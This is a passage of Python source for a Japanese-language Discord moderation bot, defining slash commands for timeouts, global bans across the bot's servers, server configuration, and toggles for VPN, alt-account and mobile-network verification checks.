        embed.add_field(name="サーバー参加日時", value=f"<t:{int(member.joined_at.timestamp())}:F> (<t:{int(member.joined_at.timestamp())}:R>)", inline=False)
        embed.add_field(name='\u200b', value='\u200b', inline=False)
        embed.add_field(name="タイムアウト期間", value=f"```{readable_duration}```", inline=False)
        embed.add_field(name="終了時刻 (UTC)", value=f"<t:{int(end_time.timestamp())}:F> (<t:{int(end_time.timestamp())}:R>)", inline=False)
        embed.add_field(name="理由", value=f"```{reason}```", inline=False)
        embed.set_footer(text=f"実行者: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
        await ctx.respond(embed=embed)
        
    except ValueError as e:
        await ctx.respond(f"期間の指定が正しくありません: {e}", ephemeral=True)
    except discord.Forbidden:
        await ctx.respond("BOTの権限が不足しているため、タイムアウトできませんでした。", ephemeral=True)
    except Exception as e:
        await ctx.respond(f"不明なエラーが発生しました: {e}", ephemeral=True)

@bot.slash_command(name="untimeout", description="指定したユーザーのタイムアウトを解除します。", guild_ids=config.get('admin_guilds', []))
async def untimeout(ctx: discord.ApplicationContext, member: discord.Member, reason: str = "理由なし"):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    if not isinstance(member, discord.Member):
        return await ctx.respond("指定されたユーザーはこのサーバーのメンバーではありません。", ephemeral=True)
    if not ctx.author.guild_permissions.moderate_members:
        return await ctx.respond("あなたにはタイムアウトを解除する権限がありません。", ephemeral=True)
    if not member.is_timed_out():
        return await ctx.respond("このユーザーはタイムアウトされていません。", ephemeral=True)
    try:
        await member.timeout(None, reason=reason)
        
        embed = discord.Embed(title="✅ タイムアウト解除", color=discord.Color.blue(), timestamp=datetime.now())
        if member.avatar: embed.set_thumbnail(url=member.avatar.url)
        embed.add_field(name="ユーザー", value=member.mention, inline=False)
        embed.add_field(name="ユーザーID", value=f"`{member.id}`", inline=False)
        embed.add_field(name="サーバー参加日時", value=f"<t:{int(member.joined_at.timestamp())}:F>", inline=False)
        embed.add_field(name="処置", value="```タイムアウト解除```", inline=False)
        embed.add_field(name="理由", value=f"```{reason}```", inline=False)
        embed.set_footer(text=f"実行者: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
        await ctx.respond(embed=embed)
    except discord.Forbidden:
        await ctx.respond("BOTの権限が不足しているため、タイムアウトを解除できませんでした。", ephemeral=True)
    except Exception as e:
        await ctx.respond(f"エラーが発生しました: {e}", ephemeral=True)


# --- グローバルBANコマンド ---
gban_group = bot.create_group("gban", "ボットが参加する全サーバーでのユーザー管理", guild_ids=config.get('admin_guilds', []))

@gban_group.command(name="add", description="指定ユーザーを全サーバーからBANし、認証をブロックします。")
async def gban_add(ctx: discord.ApplicationContext, user: discord.Option(discord.User, "BANするユーザー"), reason: discord.Option(str, "理由", required=False, default="なし")):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    await ctx.defer(ephemeral=True)

    data = load_data()
    gban_list = data.get("gban_list", {})

    if str(user.id) in gban_list:
        return await ctx.respond(f"{user.mention} ({user.id}) は既にGBANされています。", ephemeral=True)

    gban_list[str(user.id)] = reason
    data["gban_list"] = gban_list
    save_data(data)

    banned_count = 0
    errors = []
    for guild in bot.guilds:
        try:
            await guild.ban(user, reason=f"GBAN: {reason}")
            banned_count += 1
        except discord.Forbidden:
            errors.append(f"サーバー '{guild.name}' で権限がありません。")
        except Exception as e:
            errors.append(f"サーバー '{guild.name}' でエラー: {e}")
    
    embed = discord.Embed(title="🛡️ グローバルBAN実行", color=discord.Color.red(), timestamp=ctx.interaction.created_at)
    embed.description=f"**{banned_count} / {len(bot.guilds)}** のサーバーでBANを実行しました。"
    if user.avatar: embed.set_thumbnail(url=user.avatar.url)
    embed.add_field(name="対象ユーザー", value=f"{user.mention} ({user.display_name})", inline=False)
    embed.add_field(name="ユーザーID", value=f"`{str(user.id)}`", inline=False)
    embed.add_field(name='\u200b', value='\u200b', inline=False)
    embed.add_field(name="理由", value=f"```{reason}```", inline=False)
    embed.set_footer(text=f"実行者: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
    
    await ctx.channel.send(embed=embed)
    await ctx.respond("GBAN処理が完了しました。", ephemeral=True)

@gban_group.command(name="remove", description="指定ユーザーのGBAN（認証ブロック）を解除します。")
async def gban_remove(ctx: discord.ApplicationContext, user: discord.Option(discord.User, "GBANを解除するユーザー"), reason: discord.Option(str, "理由", required=False, default="なし")):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    await ctx.defer(ephemeral=True)

    data = load_data()
    gban_list = data.get("gban_list", {})

    if str(user.id) not in gban_list:
        return await ctx.respond(f"{user.mention} ({user.id}) はGBANされていません。", ephemeral=True)

    del gban_list[str(user.id)]
    data["gban_list"] = gban_list
    save_data(data)

    unbanned_count = 0
    for guild in bot.guilds:
        try:
            await guild.unban(user, reason=f"Un-GBAN: {reason}")
            unbanned_count += 1
        except (discord.NotFound, discord.Forbidden):
            pass

    embed = discord.Embed(title="✅ グローバルBAN解除", color=discord.Color.green(), timestamp=datetime.now())
    embed.description = f"ユーザーの認証ブロックを解除し、{unbanned_count}サーバーでUNBANしました。"
    if user.avatar: embed.set_thumbnail(url=user.avatar.url)
    embed.add_field(name="ユーザー", value=user.mention, inline=False)
    embed.add_field(name="ユーザーID", value=f"`{user.id}`", inline=False)
    embed.add_field(name="理由", value=f"```{reason}```", inline=False)
    embed.set_footer(text=f"実行者: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
    
    await ctx.channel.send(embed=embed)
    await ctx.respond("GBAN解除処理が完了しました。", ephemeral=True)

@gban_group.command(name="list", description="GBANされているユーザーのリストを表示します。")
async def gban_list_show(ctx: discord.ApplicationContext):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    
    data = load_data()
    gban_list = data.get("gban_list", {})

    if not gban_list:
        return await ctx.respond("GBANされているユーザーはいません。", ephemeral=True)

    description = ""
    for user_id, reason in gban_list.items():
        description += f"<@{user_id}> (`{user_id}`)\n**理由:** {reason}\n\n"

    embed = discord.Embed(title="🚫 GBANリスト (認証ブロック中のユーザー)", description=description, color=discord.Color.dark_red())
    await ctx.respond(embed=embed, ephemeral=True)


# --- ★★★ 新しい設定管理コマンド ★★★ ---
config_group = bot.create_group("config", "ボットの設定を管理します", guild_ids=config.get('admin_guilds', []))

@config_group.command(name="add_server", description="認証サーバーとロールを追加します。")
async def add_server(ctx: discord.ApplicationContext, server_id: discord.Option(str, "サーバーID"), role_id: discord.Option(str, "付与するロールのID")):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    
    current_config = load_config()
    current_config.setdefault("verify_guilds", {})[server_id] = int(role_id)
    save_config(current_config)
    
    await ctx.respond(f"✅ サーバーID `{server_id}` にロールID `{role_id}` を設定しました。\n**ボットの再起動後に設定が反映されます。**", ephemeral=True)

@config_group.command(name="remove_server", description="認証サーバーの設定を削除します。")
async def remove_server(ctx: discord.ApplicationContext, server_id: discord.Option(str, "サーバーID")):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    
    current_config = load_config()
    if server_id in current_config.get("verify_guilds", {}):
        del current_config["verify_guilds"][server_id]
        save_config(current_config)
        await ctx.respond(f"✅ サーバーID `{server_id}` の設定を削除しました。\n**ボットの再起動後に設定が反映されます。**", ephemeral=True)
    else:
        await ctx.respond(f"❌ サーバーID `{server_id}` は設定されていません。", ephemeral=True)

@config_group.command(name="add_admin", description="管理コマンドが使えるサーバーを追加します。")
async def add_admin_server(ctx: discord.ApplicationContext, server_id: discord.Option(str, "サーバーID")):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    
    current_config = load_config()
    admin_guilds = current_config.setdefault("admin_guilds", [])
    if int(server_id) not in admin_guilds:
        admin_guilds.append(int(server_id))
        save_config(current_config)
        await ctx.respond(f"✅ 管理サーバーとして `{server_id}` を追加しました。\n**ボットの再起動後にコマンドが登録されます。**", ephemeral=True)
    else:
        await ctx.respond(f"❌ サーバーID `{server_id}` は既に登録されています。", ephemeral=True)

@config_group.command(name="remove_admin", description="管理コマンドが使えるサーバーを削除します。")
async def remove_admin_server(ctx: discord.ApplicationContext, server_id: discord.Option(str, "サーバーID")):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    
    current_config = load_config()
    admin_guilds = current_config.get("admin_guilds", [])
    if int(server_id) in admin_guilds:
        admin_guilds.remove(int(server_id))
        save_config(current_config)
        await ctx.respond(f"✅ 管理サーバー `{server_id}` を削除しました。\n**ボTルの再起動後にコマンドが削除されます。**", ephemeral=True)
    else:
        await ctx.respond(f"❌ サーバーID `{server_id}` は管理サーバーとして登録されていません。", ephemeral=True)


@config_group.command(name="list", description="現在のサーバー設定を表示します。")
async def list_settings(ctx: discord.ApplicationContext):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    
    current_config = load_config()
    
    embed = discord.Embed(title="⚙️ 現在のボット設定", color=discord.Color.blue())
    
    # 認証サーバーリスト
    verify_guilds = current_config.get("verify_guilds", {})
    verify_text = ""
    if verify_guilds:
        for guild_id, role_id in verify_guilds.items():
            verify_text += f"**サーバーID:** `{guild_id}`\n**ロールID:** `{role_id}`\n\n"
    else:
        verify_text = "設定されていません。"
    embed.add_field(name="認証サーバーとロール", value=verify_text, inline=False)
    
    # 管理サーバーリスト
    admin_guilds = current_config.get("admin_guilds", [])
    admin_text = ""
    if admin_guilds:
        for guild_id in admin_guilds:
            admin_text += f"`{guild_id}`\n"
    else:
        admin_text = "設定されていません。"
    embed.add_field(name="管理コマンドサーバー", value=admin_text, inline=False)
    
    await ctx.respond(embed=embed, ephemeral=True)

# --- セキュリティ管理コマンド ---
security = bot.create_group("security", "セキュリティ機能の管理", guild_ids=config.get('admin_guilds', []))

@security.command(name="status", description="現在のセキュリティ設定を表示します")
async def security_status(ctx: discord.ApplicationContext):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    
    current_security_config = load_security_config()
    
    embed = discord.Embed(title="セキュリティ設定ステータス", color=discord.Color.blue())
    
    vpn_check = current_security_config.get("vpn_check", {})
    alt_check = current_security_config.get("alt_account_check", {})
    mobile_check = current_security_config.get("mobile_check", {})

    embed.add_field(name="VPN検知", value="✅ 有効" if vpn_check.get('enabled') else "❌ 無効", inline=False)
    embed.add_field(name="サブ垢対策", value="✅ 有効" if alt_check.get('enabled') else "❌ 無効", inline=False)
    embed.add_field(name="モバイル通信ブロック", value="✅ 有効" if mobile_check.get('enabled') else "❌ 無効", inline=False)
    
    await ctx.respond(embed=embed)

async def toggle_security_feature(ctx, feature_name_en, feature_name_jp, status):
    if ctx.author.id not in owners:
        await ctx.respond("権限がありません。", ephemeral=True)
        return
        
    current_security_config = load_security_config()
    
    current_security_config.setdefault(feature_name_en, {})['enabled'] = (status == "on")
    
    save_security_config(current_security_config)
    
    await ctx.respond(f"{feature_name_jp}を **{status.upper()}** に設定しました。", ephemeral=True)

@security.command(name="vpn", description="VPN検知機能のオン/オフ")
async def toggle_vpn(ctx: discord.ApplicationContext, status: discord.Option(str, choices=["on", "off"])):
    await toggle_security_feature(ctx, "vpn_check", "VPN検知機能", status)

@security.command(name="alt_account", description="サブ垢対策のオン/オフ")
async def toggle_alt(ctx: discord.ApplicationContext, status: discord.Option(str, choices=["on", "off"])):
    await toggle_security_feature(ctx, "alt_account_check", "サブ垢対策機能", status)

@security.command(name="mobile", description="モバイル通信ブロックのオン/オフ")
async def toggle_mobile(ctx: discord.ApplicationContext, status: discord.Option(str, choices=["on", "off"])):
    await toggle_security_feature(ctx, "mobile_check", "モバイル通信ブロック機能", status)

# --- ボットの実行 ---
if __name__ == "__main__":
    try:
        # Quartアプリをバックグラウンドで実行
        bot.loop.create_task(app.run_task(host=server_host, port=server_port))
        bot.run(token)
    except Exception as e:
        print(f"Unhandled error running bot: {e}")